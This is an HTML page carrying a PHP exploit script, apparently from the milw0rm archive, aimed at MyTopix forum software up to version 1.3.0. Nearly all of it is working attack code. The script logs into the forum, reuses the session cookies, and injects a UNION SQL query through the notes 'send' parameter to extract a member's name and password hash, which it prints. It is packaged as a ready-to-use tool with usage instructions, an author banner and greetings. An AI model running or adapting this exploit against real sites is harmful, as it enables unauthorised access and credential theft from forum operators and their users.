<html><head><title>MyTopix <= 1.3.0 (notes send) Remote SQL Injection Exploit</title></head><pre>&lt;?php

/**
*
* MyTopix &lt;= 1.3.0 (notes send) Remote SQL Injection Exploit
* Bug discovered &amp; exploited by cOndemned
* 
* Desc :
*	In order to exploit this vulnerability user have to
*	be logged on the forum, so I'd decided to write this
*	exploit x]
*
* Greetz : 
*	Ex. fobidd3n t3am - Sw33t, Kr0licz3k &amp; KraFT, irk4z,
*	ZaBeaTy, Necro, str0ke, suN8Hclf, 0in, m4r1usz, TBH, 
*	Av...
*
*
*	&quot;What is left to die for? What is left to give...&quot;
*/


class MyTopixSploit
{
	private $socket;
	private $evil;
	private $inj;
	private $host;
	private $path;
	private $login;
	private $password;
	private $csid;
	private $cpass;

	public function __construct()
	{
		$this -&gt; evil	= '';
		$this -&gt; socket	= socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
		$this -&gt; inj	= '-1+UNION+SELECT+concat(members_name,0x3a,members_pass)+FROM+my_members+WHERE+members_id=2--';
	}

	private function send($packet)
	{
		if(!$this -&gt; socket) $this -&gt; socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);

		socket_connect($this -&gt; socket, gethostbyname($this -&gt; host), 80) or die(&quot;[-] Couldn't connect with specified host\r\n&quot;);
		socket_write($this -&gt; socket, $packet, strlen($packet)) or die(&quot;[-] Couldn't send requrested packet\r\n&quot;);

		while($resp = socket_read($this -&gt; socket, 2048)) $output .= $resp;

		socket_shutdown($this -&gt; socket, 2);
		socket_close($this -&gt; socket);
		unset($this -&gt; socket);

		return $output;	
	}

	public function target($host, $path)
	{
		$this -&gt; host = (substr($host, 0, 7) === 'http://') ? substr($host, 7) : $host;
		$this -&gt; path = (substr($path, -1) === '/') ? substr($path, 0, -1) : $path;
	}

	public function usage()
	{
		return &quot;[~] Usage : php mytopix130-sql.php &lt;target_host&gt; &lt;path&gt; &lt;username&gt; &lt;user-pass&gt;\r\n\r\n&quot;;
	}

	public function login($login, $password)
	{
		$post = &quot;username=$login&amp;password=$password&amp;hash=5aaaea2d9cd5b549a857e02190cb4542&quot;;
		$this -&gt; evil = 
			&quot;POST {$this -&gt; path}/index.php?a=logon&amp;CODE=01 HTTP/1.1\r\n&quot; .
			&quot;Host: {$this -&gt; host}\r\n&quot; .
			&quot;Referer: http://{$this -&gt; host}{$this -&gt; path}\r\n&quot; . 
			&quot;User-Agent: Opera/9.62 (X11; Linux i686; U; pl) Presto/2.1.1\r\n&quot; .
			&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*#/*;q=0.8\r\n&quot; .
			&quot;Accept-Language: pl,en-us;q=0.7,en;q=0.3\r\n&quot; .
			&quot;Accept-Charset: ISO-8859-2,utf-8;q=0.7,*;q=0.7\r\n&quot; .
			&quot;Connection: Close\r\n&quot; . 
			&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot; .
			&quot;Content-length: &quot; . strlen($post) . &quot;\r\n\r\n$post&quot;;

		return $this -&gt; send($this -&gt; evil);
	}

	public function inject($cid, $cpass)
	{
		$this -&gt; evil =
			&quot;GET {$this-&gt;path}/index.php?a=notes&amp;CODE=07&amp;send=$this-&gt;inj HTTP/1.1\r\n&quot; . 
			&quot;Host: {$this-&gt;host}\r\n&quot; . 
			&quot;Referer: http://{$this-&gt;host}{$this-&gt;path}/\r\n&quot; . 
			&quot;User-Agent: Opera/9.62 (X11; Linux i686; U; pl) Presto/2.1.1\r\n&quot; .
			&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot; . 
			&quot;Accept-Language: pl,en-us;q=0.7,en;q=0.3\r\n&quot; . 
			&quot;Accept-Charset: ISO-8859-2,utf-8;q=0.7,*;q=0.7\r\n&quot; . 
			&quot;Cookie: my_id={$cid}; my_pass={$cpass}\r\n&quot; . 
			&quot;Connection: close\r\n\r\n&quot;;

		return $this -&gt; send($this -&gt; evil);
	}
}; 


$xpl = new MyTopixSploit();

echo &lt;&lt;&lt; HEADER

+--------------------------------------------------------------------------+
|                                                                          |
|        MyTopix &lt;= 1.3.0 (notes send) Remote SQL Injection Exploit        |
|        ==========================================================        |
|        Author ......................................... cOndemned        |
|        Contact ...................... digital_future[at]p2[dot]pl        |
|        Conditions ......................... Need account on forum        |
|                                                                          |
+--------------------------------------------------------------------------+


HEADER;

if($argc != 5) 
	echo $xpl -&gt; usage();
else 
{
	list($script, $host, $path, $login, $password) = $argv;
	
	$xpl -&gt; target($host, $path);
	$head = $xpl -&gt; login($login, $password);
	
	printf(&quot;[~] Trying to login with nick: %s, and password: %s...\r\n&quot;, $login, $password);

	$cookie['USERID'] = preg_match_all('!id=([0-9]+);!is', $head, $tmp) ? $tmp[1][0] : die(&quot;[-] Couldn't retrive user id\r\n&quot;);
	$cookie['PASSWD'] = preg_match_all('!pass=([a-f0-9]{32});!is', $head, $tmp) ? $tmp[1][0] : die(&quot;[-] Couldn't retrive user password\r\n&quot;);
	
	$src = $xpl -&gt; inject($cookie['USERID'], $cookie['PASSWD']);
	
	printf(&quot;[~] Sending packet ...\r\n&quot;);

	$resp = preg_match_all(&quot;!value='([a-z0-9]+?):([a-f0-9]+?)'!is&quot;, $src, $out) 
		? &quot;[+] Login: {$out[1][0]}\r\n[+] Pass: {$out[2][0]}&quot; : &quot;[-] Exploitation failed&quot;;

	printf(&quot;[~] Done...\r\n%s \r\n\r\n&quot;, $resp);
}

?&gt;

# milw0rm.com [2008-11-19]</pre></html>